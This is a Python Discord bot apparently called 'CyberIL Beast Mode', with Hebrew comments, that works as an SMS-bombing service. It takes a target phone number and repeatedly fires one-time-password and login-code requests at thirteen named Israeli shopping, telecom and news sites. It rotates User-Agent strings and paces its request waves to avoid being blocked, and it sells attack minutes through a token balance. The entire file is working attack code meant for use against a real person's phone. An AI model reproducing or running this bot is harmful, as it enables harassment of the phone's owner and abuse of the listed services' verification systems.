import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
import random
from datetime import datetime, timedelta
from motor.motor_asyncio import AsyncIOMotorClient

# --- הגדרות מערכת ---
TOKEN = os.getenv('DISCORD_TOKEN')
MONGO_URI = os.getenv('MONGO_URI')
BLOCKED_NUMBERS = ["0535524017"]

cluster = AsyncIOMotorClient(MONGO_URI)
db = cluster["cyberil"]
users_col = db["users"]
logs_col = db["logs"]

active_attacks = {}

def get_random_ua():
    version = random.randint(100, 125)
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version}.0.0.0 Safari/537.36"

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        super().__init__(command_prefix="!", intents=intents)
    async def setup_hook(self):
        await self.tree.sync()
        print(f"🔥 CyberIL BEAST MODE ONLINE")

bot = CyberBot()

async def get_user(uid):
    user = await users_col.find_one({"_id": uid})
    if not user:
        user = {"_id": uid, "tokens": 0, "last_claim": None}
        await users_col.insert_one(user)
    return user

def api_call(url, data=None, method="POST", is_json=True, params=None):
    try:
        headers = {
            "User-Agent": get_random_ua(),
            "Accept": "*/*",
            "Connection": "close" # סגירת חיבור מהירה כדי לא להעמיס על ה-RAM
        }
        if method == "GET": requests.get(url, headers=headers, params=params, timeout=3)
        elif method == "PUT": requests.put(url, json=data, headers=headers, timeout=3)
        else:
            if is_json: requests.post(url, json=data, headers=headers, timeout=3)
            else: requests.post(url, data=data, headers=headers, timeout=3)
        return True
    except: return False

async def fire_beast_round(phone):
    magento_data = {"type": "login", "telephone": phone, "bot_validation": 1}
    
    # כל המטרות
    targets = [
        ("https://www.crazyline.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.onot.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.urbanica-wh.com/customer/ajax/post/", magento_data, "POST", False),
        ("https://api.dominos.co.il/sendOtp", {"otpMethod":"text","customerId": phone,"language":"he"}, "POST", True),
        ("https://www.10bis.co.il/NextApi/GetActivationTokenAndSendActivationCodeToUser", None, "GET", True, {"culture":"he-IL", "cellPhone": phone, "email": f"asaf{random.randint(10,9999)}@gmail.com"}),
        ("https://digital-api.cellcom.co.il/api/otp/LoginStep1", {"Subscriber": phone, "OtpOrigin": "main OTP"}, "PUT", True),
        ("https://server.myofer.co.il/api/sendAuthSms", {"phoneNumber": phone}, "POST", True),
        ("https://www.timberland.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://www.fixfixfixfix.co.il/customer/ajax/post/", magento_data, "POST", False),
        ("https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, "POST", False),
        ("https://www.globes.co.il/news/login-2022/ajax_handler.ashx", {"value": phone, "value_type": "154"}, "POST", False),
        ("https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}, "POST", True),
        (f"https://www.ivory.co.il/user/login/sendCodeSms/temp{random.randint(1,999)}@gmail.com/{phone}", None, "GET", True)
    ]

    # ירייה במקביל של הכל!
    tasks = []
    for url, data, method, is_json, *params in targets:
        p = params[0] if params else None
        tasks.append(asyncio.to_thread(api_call, url, data, method, is_json, p))
    
    await asyncio.gather(*tasks)

async def run_attack(interaction, phone, minutes):
    uid = interaction.user.id
    active_attacks[uid] = True
    total_hits = 0
    end_time = datetime.now() + timedelta(minutes=minutes)
    
    await interaction.followup.send(f"🔱 **התחלת הפצצה מסיבית!** יעד: `{phone}`", ephemeral=True)

    while datetime.now() < end_time and active_attacks.get(uid):
        # בדיקה והורדת יתרה
        user = await get_user(uid)
        if user["tokens"] <= 0:
            await interaction.followup.send("⚠️ היתרה נגמרה! המתקפה נעצרה.", ephemeral=True)
            break
        
        # עדכון יתרה במסד הנתונים (מוריד 1)
        await users_col.update_one({"_id": uid}, {"$inc": {"tokens": -1}})
        
        # ירייה של 3 סבבים מהירים בתוך דקה אחת
        for _ in range(3): 
            if not active_attacks.get(uid): break
            await fire_beast_round(phone)
            total_hits += 13 # מספר האתרים
            await asyncio.sleep(15) # הפסקה קצרה בין גלים כדי לא להיחסם לגמרי

    active_attacks.pop(uid, None)
    await interaction.followup.send(f"🏁 **ההפצצה הסתיימה.** נשלחו כ-{total_hits} בקשות.", ephemeral=True)

class CyberView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="שגר הפצצה", style=discord.ButtonStyle.danger, emoji="🚀")
    async def launch(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        if user["tokens"] < 1: return await interaction.response.send_message("❌ אין לך דקות!", ephemeral=True)
        
        class LaunchModal(discord.ui.Modal, title="CyberIL Beast Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            mins = discord.ui.TextInput(label="זמן (דקות)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                if self.phone.value in BLOCKED_NUMBERS: return await modal_inter.response.send_message("🚫 חסום!", ephemeral=True)
                await modal_inter.response.defer(ephemeral=True)
                asyncio.create_task(run_attack(modal_inter, self.phone.value, int(self.mins.value)))
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="יתרה", style=discord.ButtonStyle.primary, emoji="💰")
    async def check(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        await interaction.response.send_message(f"💰 יתרה: **{user['tokens']}** דקות.", ephemeral=True)

    @discord.ui.button(label="מתנה", style=discord.ButtonStyle.success, emoji="🎁")
    async def gift(self, interaction: discord.Interaction, button: discord.ui.Button):
        user = await get_user(interaction.user.id)
        now = datetime.now()
        if not user["last_claim"] or now >= user["last_claim"] + timedelta(hours=24):
            await users_col.update_one({"_id": interaction.user.id}, {"$inc": {"tokens": 5}, "$set": {"last_claim": now}})
            await interaction.response.send_message("✅ קיבלת 5 דקות!", ephemeral=True)
        else: await interaction.response.send_message("⏳ חזור מחר.", ephemeral=True)

    @discord.ui.button(label="עצור", style=discord.ButtonStyle.secondary, emoji="🛑")
    async def stop(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🛑 נעצר.", ephemeral=True)

@bot.tree.command(name="setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    user = await get_user(interaction.user.id)
    embed = discord.Embed(title="🔱 CyberIL Beast Mode", description=f"יתרה: `{user['tokens']}` דקות", color=0xff0000)
    await interaction.response.send_message(embed=embed, view=CyberView())

@bot.tree.command(name="give", description="ניהול דקות")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    if interaction.user.id != 1148633722057031761: # שים כאן את ה-ID שלך בלבד
        return await interaction.response.send_message("❌ אין לך הרשאה.", ephemeral=True)
    await users_col.update_one({"_id": user.id}, {"$inc": {"tokens": amount}}, upsert=True)
    await interaction.response.send_message(f"🎁 הוענקו {amount} דקות ל-{user.mention}.", ephemeral=True)

bot.run(TOKEN)
